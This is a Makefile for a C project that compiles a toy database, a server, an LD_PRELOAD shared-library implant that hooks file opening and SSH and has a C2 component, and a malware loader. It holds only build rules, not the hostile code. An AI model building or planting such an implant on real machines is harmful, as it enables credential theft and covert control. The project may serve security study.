CC = gcc
CFLAGS = -Wall -Wextra 
LDFLAGS = -lssl -lcrypto -lpthread

ARG_DB = db/src/btree.c \
         db/src/savetable.c \
         db/src/main.c \
         db/src/test.c \
         db/src/command.c

ARG_SERV = server/server.c

ARG_MALWARE = ldpreload_malware/malware/hook_open.c \
              ldpreload_malware/malware/hook_ssh.c \
              ldpreload_malware/malware/sendc2.c

ARG_LOADER = ldpreload_malware/loader/loader.c

.PHONY: all db server malware loader clean

all: db server malware loader
	@echo "[+] Build complete."

db:
	@echo "[*] Compiling database project..."
	@$(CC) $(CFLAGS) $(ARG_DB) -o db/projectdb

server:
	@echo "[*] Compiling server..."
	@$(CC) $(CFLAGS) $(ARG_SERV) $(LDFLAGS) -o server/server

malware:
	@echo "[*] Compiling LD_PRELOAD malware..."
	@$(CC) $(CFLAGS) $(ARG_MALWARE) -fPIC -shared -o server/malware.so

loader:
	@echo "[*] Compiling Loader malware..."
	@$(CC) $(CFLAGS) $(ARG_LOADER) $(LDFLAGS) -o ldpreload_malware/loader/loader
	

clean:
	@echo "[*] Cleaning all built files..."
	@rm -f db/projectdb server/server ldpreload_malware/malware.so
